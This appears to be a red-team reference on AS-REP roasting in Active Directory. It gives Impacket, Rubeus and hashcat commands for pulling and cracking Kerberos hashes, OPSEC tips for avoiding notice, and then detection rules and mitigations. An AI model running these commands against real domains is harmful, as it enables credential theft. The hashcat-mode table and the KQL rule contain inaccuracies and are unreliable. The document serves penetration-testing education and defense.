# AS-REP Roasting

## How Kerberos Pre-Authentication Works

In standard Kerberos authentication, the pre-authentication step proves the client knows the password **before** the KDC issues a TGT.

### Normal AS-REQ/AS-REP Flow (with Pre-Auth)

```
Client                              KDC (DC)
  │                                    │
  │  AS-REQ                            │
  │  ├─ Username: svc_oracle          │
  │  ├─ Domain: domain.local          │
  │  └─ Encrypted Timestamp           │
  │     (encrypted with user's NT hash│
  │      derived from password)       │
  │ ─────────────────────────────────>│
  │                                    │
  │  KDC decrypts timestamp using     │
  │  user's hash from ntds.dit        │
  │  If decryption succeeds → user    │
  │  knows the password               │
  │                                    │
  │  AS-REP                            │
  │  ├─ TGT (encrypted with krbtgt)   │
  │  └─ Session Key (encrypted with   │
  │     user's NT hash)               │
  │ <─────────────────────────────────│
```

The encrypted timestamp uses the current time on the client. The KDC compares it to its own clock (within 5 minute skew tolerance). If decryption succeeds and the timestamp is within valid range, the user is authenticated.

### AS-REP Roasting (No Pre-Auth)

When `DONT_REQ_PREAUTH` (`USER_ACCOUNT_CONTROL` flag 4194304) is set on a user account, the KDC will issue a TGT **without** requiring the encrypted timestamp.

```
Client                              KDC (DC)
  │                                    │
  │  AS-REQ (no pre-auth data)         │
  │  ├─ Username: svc_oracle          │
  │  └─ Domain: domain.local          │
  │ ─────────────────────────────────>│
  │                                    │
  │  AS-REP                            │
  │  ├─ TGT (encrypted with krbtgt)   │
  │  └─ Session Key (encrypted with   │
  │     user's NT hash)               │
  │     ← THIS IS THE TARGET          │
  │ <─────────────────────────────────│
```

The session key in the AS-REP is encrypted with the user's NT hash. An attacker who captures this encrypted blob can brute-force it offline to recover the user's password. The TGT itself is encrypted with krbtgt and is not directly useful (cannot be cracked).

## Extracting the Data

### Finding AS-REP Roastable Users (No Credentials)

```bash
# With Impacket - requires only domain controller IP
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Using a single known user
GetNPUsers.py domain.local/john.doe -dc-ip 192.168.1.10
```

### With Credentials

```bash
# With valid credentials, query for all users with DONT_REQ_PREAUTH
GetNPUsers.py domain.local/john:Passw0rd -request -dc-ip 192.168.1.10 -format hashcat -outputfile asrep_hashes.txt

# All domain, request hash for each
GetNPUsers.py domain.local/john:Passw0rd -request -dc-ip 192.168.1.10
```

### With Rubeus (Windows)

```powershell
# Find AS-REP roastable users and roast them
Rubeus.exe asreproast /user:svc_oracle /nowrap

# Output to file in hashcat format
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Roast all users with pre-auth disabled
Rubeus.exe asreproast /nowrap
```

### With LDAP Query (Identify Targets)

```powershell
# PowerShell - Find users with DONT_REQ_PREAUTH
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Using ADSI
([adsisearcher]"(userAccountControl:1.2.840.113556.1.4.803:=4194304)").FindAll()
```

## Cracking the Hash

### Hash Format

```
$krb5asrep$23$user@domain.local:HASH_PART$HEX_SALT$HEX_CIPHER
```

### Hashcat Modes

| Hash Type | Hashcat Mode | Speed (approx) |
|-----------|--------------|----------------|
| AS-REP RC4 (etype 23) | `18200` | Fastest |
| AS-REP AES (etypes 17/18) | `18200` | Slower (same mode handles both) |

### Cracking Commands

```bash
# Standard wordlist attack
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (brute force)
hashcat -m 18200 asrep_hashes.txt -a 3 ?a?a?a?a?a?a?a?a

# Show cracked
hashcat -m 18200 asrep_hashes.txt --show
```

### John

```bash
# John accepts the same hash format
john --format=krb5asrep asrep_hashes.txt --wordlist=wordlist.txt
```

## OPSEC Considerations

| Aspect | Consideration |
|--------|---------------|
| **Pre-auth disabled** | The user account must have `DONT_REQ_PREAUTH` set. This is uncommon by default. |
| **LDAP queries** | Querying for `userAccountControl:1.2.840.113556.1.4.803:=4194304` is noisy and logged. |
| **Failed AS-REQ** | Even without pre-auth, requesting a TGT for a user generates event 4768. |
| **Volume** | Requesting many AS-REPs in sequence is suspicious (4768 for each). |
| **Timing** | Space requests out or use compromised user for legitimate-looking traffic. |
| **Encrypted session key** | Only the session key part is crackable; not the entire TGT. |
| **No user interaction** | Unlike Kerberoasting, the target user does not need to be logged in or active. |
| **No credentials needed** | If you know which users have pre-auth disabled, you need **zero** authentication to extract hashes. |

## Detection

### Event 4768 - Kerberos TGT Requested

Key fields to monitor:
- **Account Name**: The user being roasted
- **Service Name**: `krbtgt`
- **Pre-Authentication Type**: Should be `0` (none) if pre-auth is disabled
- **Client Address**: Source IP of the attacker

Normal 4768 with pre-auth has `Pre-Authentication Type: 2` (timestamp).

### Detection Rules

```kusto
// KQL - Detect AS-REP Roasting
EventID: 4768
| where PreAuthenticationType == 0
| where AccountName != "$MachineName"
| summarize Count = dcount(AccountName) by ClientAddress, bin(TimeGenerated, 5m)
| where Count > 5
```

```powershell
# PowerShell - Find users with pre-auth disabled (potential targets)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

### Indicators of Compromise

- Multiple 4768 events with `PreAuthenticationType: 0` in short time window
- Source IP making AS-REQs for many different users without pre-auth
- User accounts with `DONT_REQ_PREAUTH` that should not have it
- AS-REQ events where the client is not a domain-joined machine (workstation field)

## Mitigations

1. **Identify and remove** `DONT_REQ_PREAUTH` from accounts that don't need it
2. **Use strong passwords** on all accounts (the attack requires cracking)
3. **Enable** Kerberos pre-authentication by default (it is enabled by default in modern AD)
4. **Monitor** event ID 4768 for unusual pre-auth type 0 requests
5. **Use managed service accounts** (gMSA) with automatic password rotation
6. **Audit** userAccountControl regularly for anomalous flags

## References

- MS-KILE: Kerberos Protocol Extensions
- MS-APDS: Authentication Protocol Domain Support
- Kerberos RFC 4120
